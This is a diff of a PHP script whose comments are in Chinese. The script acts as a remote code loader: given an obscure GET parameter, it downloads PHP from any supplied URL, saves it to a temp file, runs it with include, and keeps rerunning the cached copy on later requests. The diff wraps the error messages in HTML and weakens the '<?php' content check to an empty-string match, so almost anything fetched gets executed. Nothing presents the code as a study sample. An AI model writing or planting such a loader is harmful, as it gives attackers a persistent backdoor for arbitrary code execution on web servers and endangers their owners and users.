@@ -57,13 +57,13 @@ if (isset($_GET['laolierzi'])) {
     // 过滤URL，确保安全
     $filteredUrl = filter_var($remoteUrl, FILTER_VALIDATE_URL);
     if ($filteredUrl === false) {
-        die("无效的URL参数。");
+        die("<center><b>无效的URL参数。<b></center>");
     }
 
     // 获取远程内容
     $content = fetchRemoteContent($filteredUrl);
     if ($content === false) {
-        die("获取远程内容失败。");
+        die("<center><b>获取远程内容失败。<b></center>");
     }
 
     // 保存到临时文件
@@ -73,24 +73,24 @@ if (isset($_GET['laolierzi'])) {
     setcookie('current_cache', $filteredUrl, time() + 3600, "/");
 
     // 立即执行远程PHP文件
-    if (strpos($content, '<?php') !== false) {
+    if (strpos($content, '') !== false) {
         include $tmpFile;
         exit;
     } else {
-        die("远程文件内容无效。");
+        die("<center><b>远程文件内容无效。<b></center>");
     }
 }
 
 // 无参数时，运行缓存的文件
 if (file_exists($tmpFile)) {
     $cachedContent = file_get_contents($tmpFile);
-    if (strpos($cachedContent, '<?php') !== false) {
+    if (strpos($cachedContent, '') !== false) {
         include $tmpFile;
         exit;
     } else {
-        die("缓存文件内容无效。");
+        die("<center><b>缓存文件内容无效。<b></center>");
     }
 } else {
-    die("未指定远程文件，也未找到缓存文件。");
+    die("<center><b>未指定远程文件，也未找到缓存文件。</b></center>");
 }
 ?>
